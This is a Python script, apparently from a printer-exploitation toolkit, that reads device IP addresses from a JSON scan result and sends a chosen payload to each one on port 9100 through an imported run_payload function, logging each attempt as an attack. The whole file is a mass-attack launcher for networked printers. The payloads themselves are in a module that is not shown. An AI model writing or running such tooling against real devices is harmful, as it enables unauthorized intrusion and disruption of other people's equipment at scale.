import sys
import os

# Adiciona a raiz do projeto ao path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import json
from pret.payloads import run_payload

import glob

def load_targets(file):
    matched = glob.glob(file)
    if not matched:
        raise FileNotFoundError(f"No file matched: {file}")
    with open(matched[0], 'r') as f:
        return json.load(f)


def mass_attack(file, payload, substitutions=None):
    targets = load_targets(file)
    for device in targets:
        ip = device['ip']
        print(f"\n[ATTACK] {ip} → {payload}")
        try:
            run_payload(ip, 9100, payload, substitutions or {})
        except Exception as e:
            print(f"[ERROR] {ip}: {e}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--targets', required=True, help='Path to JSON scan result')
    parser.add_argument('--payload', required=True, help='Payload to execute')
    parser.add_argument('--sub', nargs='*', help='Optional substitutions (key=value)')
    args = parser.parse_args()

    def parse_subs(sub_list):
        subs = {}
        if sub_list:
            for s in sub_list:
                if "=" in s:
                    k, v = s.split("=", 1)
                    subs[k] = v
        return subs

    subs = parse_subs(args.sub)
    mass_attack(args.targets, args.payload, subs)
